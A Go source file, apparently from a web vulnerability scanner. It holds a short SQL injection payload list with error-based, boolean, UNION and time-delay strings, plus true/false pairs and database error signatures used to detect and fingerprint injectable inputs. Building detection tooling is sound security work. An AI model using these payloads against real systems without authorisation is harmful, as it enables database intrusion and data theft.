package sqli

type PayloadType string

const (
	PayloadError   PayloadType = "error"
	PayloadBoolean PayloadType = "boolean"
	PayloadTime    PayloadType = "time"
)

type Payload struct {
	Value string      `json:"value"`
	Type  PayloadType `json:"type"`
}

// Payloads is a small, well-known SQLi wordlist covering the major DB
// engines: error-based (triggers a visible DB error), boolean-based (changes
// the response depending on a true/false condition) and time-based blind
// (introduces a measurable delay). Kept intentionally short — this is a
// quick signal check, not an exhaustive fuzzer.
var Payloads = []Payload{
	{`'`, PayloadError},
	{`"`, PayloadError},
	{`' OR '1'='1`, PayloadBoolean},
	{`' OR '1'='1' --`, PayloadBoolean},
	{`' OR 1=1--`, PayloadBoolean},
	{`' OR 1=1#`, PayloadBoolean},
	{`" OR "1"="1`, PayloadBoolean},
	{`') OR ('1'='1`, PayloadBoolean},
	{`admin'--`, PayloadBoolean},
	{`' UNION SELECT NULL--`, PayloadError},
	{`' UNION SELECT NULL,NULL--`, PayloadError},
	{`' AND 1=CONVERT(int,(SELECT @@version))--`, PayloadError},
	{`' AND extractvalue(1,concat(0x7e,version()))--`, PayloadError},
	{`' AND 1=1`, PayloadBoolean},
	{`' AND 1=2`, PayloadBoolean},
	{`' OR SLEEP(3)--`, PayloadTime},
	{`'; WAITFOR DELAY '0:0:3'--`, PayloadTime},
	{`' OR pg_sleep(3)--`, PayloadTime},
}

// BooleanPair is a matched "always true" / "always false" injection used to
// reliably detect boolean-based blind SQLi: the two responses are compared
// to EACH OTHER, not to the original baseline (see sqlicheck.go for why).
type BooleanPair struct {
	True  Payload
	False Payload
}

var BooleanPairs = []BooleanPair{
	{
		True:  Payload{`' AND 1=1-- `, PayloadBoolean},
		False: Payload{`' AND 1=2-- `, PayloadBoolean},
	},
	{
		True:  Payload{`" AND 1=1-- `, PayloadBoolean},
		False: Payload{`" AND 1=2-- `, PayloadBoolean},
	},
	{
		True:  Payload{`' OR '1'='1`, PayloadBoolean},
		False: Payload{`' OR '1'='2`, PayloadBoolean},
	},
}

// errorSignature is a (database, regex-as-substring-list) pair. Kept as
// plain substrings rather than regexes: DB error pages are noisy HTML and
// simple case-insensitive substring checks are plenty reliable here.
type errorSignature struct {
	Database string
	Markers  []string
}

var errorSignatures = []errorSignature{
	{"MySQL", []string{
		"you have an error in your sql syntax",
		"warning: mysql",
		"mysql_fetch",
		"mysqli_",
		"supplied argument is not a valid mysql",
	}},
	{"PostgreSQL", []string{
		"pg_query()",
		"pg_exec()",
		"postgresql query failed",
		"unterminated quoted string",
		"syntax error at or near",
	}},
	{"Microsoft SQL Server", []string{
		"unclosed quotation mark",
		"microsoft sql native client",
		"sqlserver jdbc driver",
		"system.data.sqlclient",
		"[microsoft][odbc sql server driver]",
	}},
	{"Oracle", []string{
		"ora-01756",
		"ora-00933",
		"ora-00921",
		"oracle error",
		"oracle.jdbc",
	}},
	{"SQLite", []string{
		"sqlite3::sqlexception",
		"sqlite_error",
		"sqlite3.operationalerror",
		"near \"\": syntax error",
	}},
	{"Generic", []string{
		"sql syntax",
		"syntax error",
		"odbc drivers error",
		"database error",
		"unclosed quotation mark after the character string",
	}},
}
